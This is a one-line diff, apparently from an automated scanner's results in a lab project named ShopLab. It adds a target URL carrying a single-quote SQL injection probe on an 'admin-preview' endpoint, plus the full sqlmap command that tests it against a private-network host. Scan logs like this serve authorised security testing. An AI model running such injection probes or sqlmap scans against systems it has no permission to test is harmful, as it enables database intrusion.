@@ -1,0 +1,1 @@
+http://172.23.112.1:8080/api/products/admin-preview?query=%27 (GET)  # /usr/bin/sqlmap -u http://172.23.112.1:8080/api/products/admin-preview?query=%27 --batch --level 1 --risk 1 --flush-session --disable-coloring --output-dir /mnt/c/Users/yamin/ShopLab/auto_scanner/results/20260505-172654_172.23.112.1_8080/raw/sqlmap/output
